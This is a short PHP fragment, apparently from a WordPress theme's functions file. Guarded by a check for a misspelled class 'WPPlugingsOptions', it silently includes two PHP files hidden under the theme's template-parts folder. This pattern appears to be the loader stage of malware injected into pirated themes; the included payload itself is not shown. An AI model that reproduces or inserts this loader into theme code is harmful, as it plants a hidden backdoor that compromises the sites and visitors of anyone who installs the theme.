...
if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( get_template_directory() . '/template-parts/class_theme-functions.php' ) ) {
	include_once( get_template_directory() . '/template-parts/class_theme-functions.php' );
}
if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( get_template_directory() . '/template-parts/template-parts.php' ) ) {
	include_once( get_template_directory() . '/template-parts/template-parts.php' );
}
